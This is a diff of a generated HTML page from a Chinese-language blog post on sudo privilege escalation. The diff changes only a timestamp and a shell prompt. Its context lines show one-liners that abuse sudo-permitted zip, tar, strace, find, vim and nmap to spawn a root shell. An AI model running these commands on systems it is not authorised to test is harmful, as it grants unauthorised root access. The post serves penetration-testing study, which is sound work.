@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Fxven Blog">
 <meta property="og:description" content="Sudo Privilege Escalation">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-20T10:44:47.508Z">
+<meta property="og:updated_time" content="2019-04-20T10:45:07.886Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sudo提权">
 <meta name="twitter:description" content="Sudo Privilege Escalation">
@@ -362,7 +362,7 @@
 <h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a><strong>zip</strong></h4><p><code>$ sudo zip /tmp/test.zip /tmp/test -T --unzip-command =&quot;sh -c /bin/bash&quot;</code></p>
 <h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a><strong>tar</strong></h4><p><code>$ sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash</code></p>
 <h4 id="strace"><a href="#strace" class="headerlink" title="strace"></a><strong>strace</strong></h4><p><code>$ sudo strace -o /dev/null /bin/bash</code></p>
-<h4 id="find"><a href="#find" class="headerlink" title="find"></a><strong>find</strong></h4><p><code>sudo find /etc/passw -exec /bin/sh \;</code><br>&ensp;&ensp;<strong><em>or</em></strong><br><code>$ sudo find /bin -name nano -exec /bin/sh \;</code></p>
+<h4 id="find"><a href="#find" class="headerlink" title="find"></a><strong>find</strong></h4><p><code>$ sudo find /etc/passw -exec /bin/sh \;</code><br>&ensp;&ensp;<strong><em>or</em></strong><br><code>$ sudo find /bin -name nano -exec /bin/sh \;</code></p>
 <h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a><strong>vim</strong></h4><p><code>$ sudo vim -c &#39;!/bin/sh&#39;</code></p>
 <h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h4><p>旧版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap --interactive</span><br><span class="line">nmap&gt; !/bin/sh</span><br></pre></td></tr></table></figure></p>
 <p><code>$ echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></p>
